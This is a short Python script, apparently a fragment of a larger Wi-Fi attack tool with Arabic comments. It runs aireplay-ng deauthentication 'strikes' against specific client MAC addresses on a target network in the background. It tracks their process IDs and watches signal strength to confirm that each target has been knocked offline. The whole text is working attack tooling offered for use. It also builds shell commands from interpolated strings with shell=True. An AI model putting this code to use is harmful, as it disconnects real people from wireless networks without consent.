#!/usr/bin/env python3
import subprocess, time

class M4SmartArtillery:
    @staticmethod
    def launch_salvo_and_get_pids(clean_pool, target_socket, engine_instance):
        """إشعال قاذف كالي الموقوت بالخلفية واصطياد المعرف الفردي الصافي كـ String منعاً للـ TypeError"""
        for s_idx, tgt in enumerate(clean_pool):
            subprocess.Popen(f"nohup {tgt['cmd']} >/dev/null 2>&1 &", shell=True)
            time.sleep(0.2)
            res = subprocess.check_output(f"pgrep -f 'aireplay-ng .* -c {tgt['client']} {target_socket}' || echo ''", shell=True)
            lines = [l.strip() for l in res.decode().split('\n') if l.strip()]
            engine_instance.active_strikes[s_idx + 1] = {"client": tgt["client"], "pid": lines, "status": "يتم قذفه حياً 🚀"}
        return len(engine_instance.active_strikes)

    @staticmethod
    def track_signal_potency(clean_pool, active_strikes):
        """مراقبة الـ Power اللحظي حياً لفحص نجاح سقوط إشغالات الأهداف لمنع تعليق الـ Deadlock لطلبك"""
        p_map = {s["client"]: s["power"] for s in clean_pool}
        for num, s in active_strikes.items():
            client = s["client"]
            if client in p_map:
                p = int(p_map[client].replace("-","").strip()) if p_map[client].strip().replace("-","").isdigit() else 99
                s["status"] = "🎯 تم التعطيل (Signal Dropped)" if p >= 85 or p == 0 else f"يتم قذفه حياً 🚀 (-{p} dBm)"
            else: s["status"] = "💤 الهدف غادر النطاق وانقطع الربط"
        return active_strikes
